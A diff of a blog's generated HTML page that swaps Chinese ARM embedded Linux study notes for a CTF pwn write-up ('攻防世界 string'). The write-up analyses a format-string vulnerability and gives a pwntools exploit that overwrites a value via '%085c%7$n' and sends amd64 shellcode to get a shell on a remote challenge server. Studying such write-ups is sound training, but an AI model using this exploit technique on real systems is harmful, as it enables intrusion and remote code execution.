@@ -16,24 +16,29 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 嵌入式系统入门什么是嵌入式系统： 一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。">
+    <meta name="description" content="checksec 查看保护机制  注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000. 思路分析IDA64查看，在sub_400CA6()中发现：v1被强">
 <meta property="og:type" content="article">
-<meta property="og:title" content="《ARM嵌入式Linux系统开发详解》学习笔记1">
-<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/index.html">
+<meta property="og:title" content="攻防世界 string">
+<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="0x01 嵌入式系统入门什么是嵌入式系统： 一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。">
+<meta property="og:description" content="checksec 查看保护机制  注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000. 思路分析IDA64查看，在sub_400CA6()中发现：v1被强">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png">
-<meta property="article:published_time" content="2022-08-09T03:21:41.844Z">
-<meta property="article:modified_time" content="2022-08-09T03:22:14.420Z">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png">
+<meta property="article:published_time" content="2022-08-09T03:17:04.194Z">
+<meta property="article:modified_time" content="2020-09-10T07:29:14.011Z">
 <meta property="article:author" content="Sinky">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png">
   
   
   
-  <title>《ARM嵌入式Linux系统开发详解》学习笔记1 - Sinky&#39;s Blog</title>
+  <title>攻防世界 string - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +206,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="《ARM嵌入式Linux系统开发详解》学习笔记1"></span>
+            <span id="subtitle" data-typed-text="攻防世界 string"></span>
           
         </div>
 
@@ -212,7 +217,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-09 11:21" pubdate>
+        <time datetime="2022-08-09 11:17" pubdate>
           August 9, 2022 am
         </time>
       </span>
@@ -224,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.6k words
+          2k words
         
       </span>
     
@@ -235,7 +240,7 @@
         
         
         
-          30 mins
+          17 mins
         
       </span>
     
@@ -273,241 +278,51 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">《ARM嵌入式Linux系统开发详解》学习笔记1</h1>
+            <h1 style="display: none">攻防世界 string</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p>
-<p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p>
-<p><b>嵌入式微控制器：</b></p>
-<p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p>
-<p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p>
-<p><b>嵌入式微处理器：</b></p>
-<p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p>
-<p><b>典型嵌入式系统组成：</b></p>
-<p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p>
-<p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p>
-<p>典型嵌入式系统:</p>
-<ul>
-<li>硬件：<ul>
-<li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li>
-<li>外部设备：在不同系统中有不同选择。</li>
-</ul>
-</li>
-<li>软件：<ul>
-<li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li>
-<li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li>
-</ul>
-</li>
-</ul>
-<h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p>
-<p>进制转换</p>
-<p>计算机组成原理</p>
-<p>直接内存访问：DMA</p>
-<p>软件：系统软件、应用软件</p>
-<p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p>
-<p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p>
-<p>操作系统的基本结构都是内核、驱动程序、程序库。</p>
-<h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul>
-<li>微处理器<ul>
-<li>通用微处理器：用于高性能计算</li>
-<li>嵌入式微处理器：针对某种特定应用的高能力计算</li>
-<li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li>
-</ul>
-</li>
-</ul>
-<p>ARM:高性能RISC机器。</p>
-<ul>
-<li>芯片体积小，功耗低，成本低性能优异</li>
-<li>支持Thumb(16位)和ARM(32位)</li>
-<li>内部大量使用寄存器，执行指令速度快。</li>
-<li>大部分指令是操作寄存器，很少访问外部内存</li>
-<li>采用多级流水线结构处理速度快。</li>
-<li>多种寻址方式，数据存取方式灵活</li>
-<li>指令长度固定，便于编译器操作以及执行指令</li>
-</ul>
-<h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul>
-<li>算术运算指令<ul>
-<li>ADD:加法运算<ul>
-<li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li>
-</ul>
-</li>
-<li>ADC:带进位加法<ul>
-<li>ADC dest,op1,op2</li>
-</ul>
-</li>
-<li>SUB:减法<ul>
-<li>sub dest,op1,op2</li>
-<li>dest=op1-op2</li>
-</ul>
-</li>
-<li>SBC：带进位减法</li>
-</ul>
-</li>
-<li>逻辑运算指令<ul>
-<li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul>
-<li>and dest,op1,op2</li>
-<li>dest=op1 and op2</li>
-</ul>
-</li>
-<li>EOR:异或（1 1为0，0 0为0，10为1）</li>
-<li>MOV:复制数据<ul>
-<li>mov dest,op1</li>
-<li>dest=op1</li>
-<li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>分支指令<ul>
-<li>B:跳转<ul>
-<li>b 地址 //跳转到指定地址</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>数据传送指令<ul>
-<li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul>
-<li>LDR Rd,地址</li>
-<li>STR Rd,地址</li>
-<li>LDR B Rd,地址</li>
-<li>STR B Rd,地址</li>
-</ul>
-</li>
-<li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul>
-<li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li>
-<li>xx:LD–装载，ST–存储</li>
-<li>LDMED LDMIB//++i</li>
-<li>LDMFD LDMIA//i++</li>
-<li>LDMEA LDMDB//++*i</li>
-<li>LDMFA LDMDA//*i++</li>
-<li>STMFA STMIB//存储前增加地址</li>
-<li>STMEA STMIA//存储后增加地址</li>
-<li>STMFD STMDB//存储前增加值</li>
-<li>STMED STMDA//存储后增加值</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p>
-<p>MMU:内存管理单元。</p>
+                <p>checksec 查看保护机制</p>
+<p><img src="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p>注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。</p>
+<p><img src="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-1901e053361f6609.png"></p>
 <blockquote>
-<p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p>
+<p>注：<code> ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将v1强制转换为一个函数指针</p>
 </blockquote>
-<h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul>
-<li>立即寻址:用#表示数值<ul>
-<li>subs r0,#1;r0=r0-1</li>
-<li>mov r0,#0xff00;r0=0xff00</li>
-</ul>
-</li>
-<li>寄存器寻址方式：读取寄存器得到操作数<ul>
-<li>mov r1,r2;r1=r2</li>
-<li>sub r0,r1,r2;r0=r1-r2</li>
-</ul>
-</li>
-<li>寄存器偏移寻址：寄存器的值移位得结果<ul>
-<li>mov r0,r1,LSL #3;r0=r1*8</li>
-<li>ands r0,r2,LSL #3;r0= r2*8 and r1</li>
-</ul>
-</li>
-<li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul>
-<li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li>
-<li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li>
-</ul>
-</li>
-<li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul>
-<li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li>
-<li>STR r0,[r1,#-2];r1数值-2得到数据地址</li>
-</ul>
-</li>
-<li>多寄存器寻址：一次传输多个寄存器值<ul>
-<li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li>
-</ul>
-</li>
-<li>栈寻址：先进后出，通过栈指针寄存器寻址<ul>
-<li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li>
-<li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li>
-</ul>
-</li>
-</ul>
-<h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p>
-<h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul>
-<li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li>
-<li>linux下：串口工具minicom</li>
-<li>windows下：串口工具xshell</li>
-<li>ARM集成开发环境ADS<ul>
-<li>c语言编译器armcc</li>
-<li>c++语言编译器armcpp</li>
-</ul>
-</li>
-</ul>
-<h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul>
-<li>vi创建源代码文件hello.c</li>
-<li>gcc -c hello.c 编译运行</li>
-</ul>
-<h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1><ul>
-<li>堆栈</li>
-<li>内存管理函数<ul>
-<li>malloc():分配内存，不能初始化内存空间</li>
-<li>free()：释放malloc()分配的内存</li>
-</ul>
-</li>
-<li>实用的内存分配函数<ul>
-<li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li>
-<li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li>
-</ul>
-</li>
-<li>文件指针和流：FILE*fp</li>
-<li>getc() /fgetc() /getchar()</li>
-<li>POSIX文件I/O编程<ul>
-<li>POSIX可移植操作系统接口</li>
-<li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li>
-<li>文件头：<ul>
-<li>&lt;sys/types.h&gt;</li>
-<li>&lt;sys/stat.h&gt;</li>
-<li>&lt;fcntl.h&gt;</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="0x08-开发多进程-x2F-线程程序"><a href="#0x08-开发多进程-x2F-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1><ul>
-<li>PCB进程控制块</li>
-<li>fork()调用创建进程</li>
-<li>退出进程：exit()、_exit()、atexit()、on_exit().</li>
-<li>常用进程间通信方法：<ul>
-<li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul>
-<li>pipe()函数：创建管道</li>
-<li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li>
-</ul>
-</li>
-<li>共享内存：不同进程可访问<ul>
-<li>int shmget():创建</li>
-<li>void *shmat：获得一个共享内存ID对应的内存其实地址</li>
-<li>int shmdt：从程序中分立一块共享内存</li>
-</ul>
-</li>
-<li>FIFO</li>
-<li>消息队列</li>
-<li>信号量</li>
-<li>共享存储</li>
-<li>socker</li>
-</ul>
-</li>
-<li>Linux的多进程和多线程</li>
-</ul>
-<h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul>
-<li>TCP/IP协议簇</li>
-</ul>
-<p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
-<ul>
-<li>IP协议：在传输层，负责数据包的传输管理<ul>
-<li>实现两个功能：寻址和分段</li>
-</ul>
-</li>
-</ul>
+<p>其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.</p>
+<p><img src="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-161d0aad17e6e884.png"></p>
+<p>可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85</p>
+<p>按流程分析：<br>在sub_400A7D()中，满足s1==“east”，则跳出函数。</p>
+<p>在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p>
+<p><img src="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-6cdde7e8a076f299.png"></p>
+<p><code>printf(&amp;format, &amp;format);</code></p>
+<p>通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p>
+<blockquote>
+<p>函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。</p>
+</blockquote>
+<blockquote>
+<p>利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.</p>
+</blockquote>
+<blockquote>
+<p>Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）</p>
+</blockquote>
+<p><code>printf(shellcraft.sh())  #打印出shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode</code></p>
+<p>用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：</p>
+<p><img src="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-fe71239050c56166.png"></p>
+<p>填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）</p>
+<blockquote>
+<p>conext.log_level=”debug”  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错</p>
+</blockquote>
+<p>补：<br>之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。</p>
+<p><img src="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-56395b2513720994.png"></p>
+<p>exp：</p>
+<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br> #<span class="hljs-attribute">sh</span>=process('./string')<br><span class="hljs-attribute">sh</span>=remote('111.198.29.45',36129)<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">'debug'</span><br>sh.recvuntil(<span class="hljs-string">'secret[0] is'</span>)<br><span class="hljs-attribute">v3_addr</span>=int(sh.recv(7),16)<br>sh.recvuntil(<span class="hljs-string">'name be:'</span>)<br>sh.sendline(<span class="hljs-string">'zzz'</span>)<br>sh.recvuntil(<span class="hljs-string">'east or up?:'</span>)<br>sh.sendline(<span class="hljs-string">'east'</span>)<br>sh.recvuntil(<span class="hljs-string">'leave(0)?:'</span>)<br>sh.sendline(<span class="hljs-string">'1'</span>)<br>sh.recvuntil(<span class="hljs-string">'\'</span>Give me an address\<span class="hljs-string">''</span>)<br>sh.sendline(str(v3_addr))<br>sh.recvuntil(<span class="hljs-string">'you wish is:'</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'%085c'</span>+'%7$n'<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">'I will help you! USE YOU SPELL'</span>)<br>sh.sendline(asm(shellcraft.amd64.linux.sh(),<span class="hljs-attribute">arch</span>=<span class="hljs-string">"amd64"</span>))<br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure>
+
+
+<p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>
 
                 
               </div>
@@ -520,7 +335,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a>
+        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/pwn/">#pwn</a>
       
     </div>
   
@@ -532,8 +347,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>《ARM嵌入式Linux系统开发详解》学习笔记1</div>
-      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/《ARM嵌入式Linux系统开发》学习笔记1/</div>
+      <div>攻防世界 string</div>
+      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/攻防世界pwn-string/</div>
     </div>
     <div class="license-meta">
       
@@ -575,9 +390,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" title="《物联网渗透测试》学习笔记1">
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" title="《ARM嵌入式Linux系统开发详解》学习笔记1">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">《物联网渗透测试》学习笔记1</span>
+                        <span class="hidden-mobile">《ARM嵌入式Linux系统开发详解》学习笔记1</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -585,8 +400,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" title="攻防世界 string">
-                        <span class="hidden-mobile">攻防世界 string</span>
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" title="攻防世界 int_overflow">
+                        <span class="hidden-mobile">攻防世界 int_overflow</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
